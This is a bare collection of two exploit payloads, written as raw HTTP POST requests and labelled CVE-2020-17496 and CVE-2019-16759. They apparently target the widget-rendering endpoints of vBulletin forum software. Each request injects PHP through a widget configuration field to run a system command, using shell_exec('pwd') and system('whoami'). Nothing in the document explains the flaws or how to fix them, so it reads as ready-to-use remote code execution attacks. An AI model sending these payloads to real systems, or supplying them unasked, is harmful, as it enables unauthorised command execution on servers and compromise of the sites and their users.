### CVE-2020-17496

``` 
POST /ajax/render/widget_tabbedcontainer_tab_panel?XDEBUG_SESSION_START=phpstorm HTTP/1.1
Host: localhost
User-Agent: curl/7.54.0
Accept: */*
Content-Length: 100
Content-Type: application/x-www-form-urlencoded

subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec("pwd"); exit;

```


### CVE-2019-16759
``` curl
POST /index.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Connection: close

routestring=ajax/render/widget_php&widgetConfig[code]=system('whoami');
```
